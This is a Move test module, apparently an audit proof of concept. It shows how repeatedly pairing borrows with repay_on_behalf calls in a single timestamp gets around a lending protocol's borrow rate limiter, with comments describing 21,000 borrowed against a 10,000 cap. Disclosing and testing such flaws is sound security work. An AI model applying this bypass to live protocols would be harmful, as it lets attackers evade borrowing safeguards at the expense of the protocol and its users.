/// PoC: Borrow Rate Limiter Bypass via repay_on_behalf
///
/// Demonstrates that an attacker can cycle borrow → repay_on_behalf → borrow
/// within a single timestamp to exceed the borrow rate limiter's outflow_limit.
///
/// The test uses the limiter module directly to show the bypass mechanism.
/// In a full integration test, this would be combined with borrow/repay_on_behalf
/// calls through the market entry points.

#[test_only]
module protocol::poc_063_borrow_limiter_bypass;

use protocol::limiter;

/// Demonstrates that the borrow rate limiter can be bypassed by cycling
/// add_outflow (borrow) and reduce_outflow (repay_on_behalf) at the same timestamp.
///
/// Setup:
/// - Limiter: 10,000 outflow limit, 24h cycle, 1h segments
/// - Old segments: 3,000 total outflow (from prior borrows)
/// - Available capacity: 7,000
///
/// Attack:
/// - Borrow 7,000 → at limit (10,000)
/// - reduce_outflow 7,000 (repay_on_behalf) → back to 3,000
/// - Borrow 7,000 again → at limit (10,000)
/// - reduce_outflow 7,000 (repay_on_behalf) → back to 3,000
/// - Borrow 7,000 again → at limit (10,000)
///
/// Result: Attacker borrowed 3 × 7,000 = 21,000 total, but limiter only shows 7,000
/// of current-segment outflow. The rate limit of 10,000 per cycle was bypassed.
#[test]
fun test_borrow_limiter_bypass_via_repay_on_behalf() {
    let segment_duration: u64 = 3600;      // 1 hour
    let cycle_duration: u64 = 86400;       // 24 hours
    let outflow_limit: u64 = 10_000;

    let mut limiter = limiter::new_from_struct(limiter::create_new_limiter_change(
        outflow_limit,
        (cycle_duration as u32),
        (segment_duration as u32),
    ));

    // --- Setup: simulate old borrows in previous segments totaling 3,000 ---
    let base_time: u64 = 100_000;

    // Segment at time base_time: 1,000 outflow
    limiter.add_outflow(base_time, 1_000);

    // Segment at time base_time + 3600: 1,000 outflow
    limiter.add_outflow(base_time + segment_duration, 1_000);

    // Segment at time base_time + 7200: 1,000 outflow
    limiter.add_outflow(base_time + 2 * segment_duration, 1_000);

    // Now advance to a new segment where the attack happens
    let attack_time = base_time + 3 * segment_duration; // same cycle window, new segment

    // Verify: current outflow = 3,000 (from 3 old segments)
    let usage = limiter.current_usage(attack_time);
    assert!(usage.usage() == 3_000, 0);
    assert!(usage.limit() == 10_000, 1);

    // --- Attack Cycle 1: Borrow 7,000 (reaches limit) ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow1 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow1.usage() == 10_000, 2); // At limit!

    // Simulate repay_on_behalf: reduce_outflow by 7,000 (repaying victim's debt)
    limiter.reduce_outflow(attack_time, 7_000);

    let usage_after_repay1 = limiter.current_usage(attack_time);
    assert!(usage_after_repay1.usage() == 3_000, 3); // Back to 3,000! Limit freed.

    // --- Attack Cycle 2: Borrow 7,000 again (limiter allows it!) ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow2 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow2.usage() == 10_000, 4); // At limit again

    // Simulate repay_on_behalf again
    limiter.reduce_outflow(attack_time, 7_000);

    let usage_after_repay2 = limiter.current_usage(attack_time);
    assert!(usage_after_repay2.usage() == 3_000, 5); // Reset again!

    // --- Attack Cycle 3: Borrow 7,000 one more time ---
    limiter.add_outflow(attack_time, 7_000);

    let usage_after_borrow3 = limiter.current_usage(attack_time);
    assert!(usage_after_borrow3.usage() == 10_000, 6); // At limit

    // --- Verification ---
    // The attacker has borrowed 3 × 7,000 = 21,000 total
    // The rate limiter was supposed to cap total outflow at 10,000 per cycle
    // Only 7,000 of net new capacity was available (10,000 - 3,000 old)
    // But attacker borrowed 21,000 (3x the available capacity!)
    //
    // In a real attack through the market:
    //   - Attacker's obligation debt: 21,000
    //   - Victim obligations' debt reduced by: 14,000 (2 × 7,000 repaid)
    //   - Attacker holds: 7,000 coins (from last borrow)
    //   - Rate limiter shows: 10,000 total (only 7,000 in current segment + 3,000 old)
    //   - Reserve.debt and emode_total are both net unchanged (borrow+repay cancel out)
    //
    // The rate limiter, emode borrow limit, and reserve borrow limit are ALL bypassed.

    // Final state: limiter shows 10,000 (at limit) but 21,000 was actually borrowed
    let final_usage = limiter.current_usage(attack_time);
    assert!(final_usage.usage() == 10_000, 7);

    // The attacker accumulated 21,000 of individual debt while the system
    // thinks only 7,000 of net new borrowing occurred in this window.
}

/// Shows that without the bypass, borrowing beyond the limit correctly fails.
#[test]
#[expected_failure(abort_code = 105, location = protocol::limiter)]
fun test_borrow_limiter_blocks_without_bypass() {
    let segment_duration: u64 = 3600;
    let cycle_duration: u64 = 86400;
    let outflow_limit: u64 = 10_000;

    let mut limiter = limiter::new_from_struct(limiter::create_new_limiter_change(
        outflow_limit,
        (cycle_duration as u32),
        (segment_duration as u32),
    ));

    let base_time: u64 = 100_000;

    // Old borrows: 3,000
    limiter.add_outflow(base_time, 1_000);
    limiter.add_outflow(base_time + segment_duration, 1_000);
    limiter.add_outflow(base_time + 2 * segment_duration, 1_000);

    let attack_time = base_time + 3 * segment_duration;

    // First borrow: 7,000 → total 10,000 (at limit)
    limiter.add_outflow(attack_time, 7_000);

    // Second borrow without repay_on_behalf bypass: SHOULD FAIL
    // This correctly aborts with outflow_reach_limit_error (code 105)
    limiter.add_outflow(attack_time, 7_000);
}
